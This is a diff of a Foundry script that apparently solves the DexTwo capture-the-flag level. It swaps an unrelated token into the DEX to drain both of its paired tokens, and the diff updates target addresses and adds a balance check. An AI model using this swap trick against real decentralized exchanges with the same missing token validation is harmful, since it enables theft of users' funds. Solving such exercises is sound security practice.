@@ -5,17 +5,20 @@ pragma solidity ^0.8.0;
 import "forge-std/Script.sol";
 import {DexTwo} from "../src/Dex2.sol";
 
-contract POC is Script {
+contract DeployDex2AttackSwap is Script {
 
     DexTwo public dexTwo;
 
     function run() external{
         vm.startBroadcast();
 
-        dexTwo = DexTwo(0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9);
-        address BTN = address(0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed);
+        dexTwo = DexTwo(0x8cB3D36C8647F4dD201D85862Dbd76a31A611Fea);
+        address BTN = address(0x922d8de2ABB85f3bfB264C46Fe3Da06a8160A51e);
         address token1 = dexTwo.token1();
         address token2 = dexTwo.token2();
+
+        uint256 btnBalance = dexTwo.balanceOf(BTN, address(this));
+        require(btnBalance >= 100, "Not enough BTN tokens to swap");
 
         dexTwo.swap(BTN, token1, 100);
         dexTwo.swap(BTN, token2, 200);
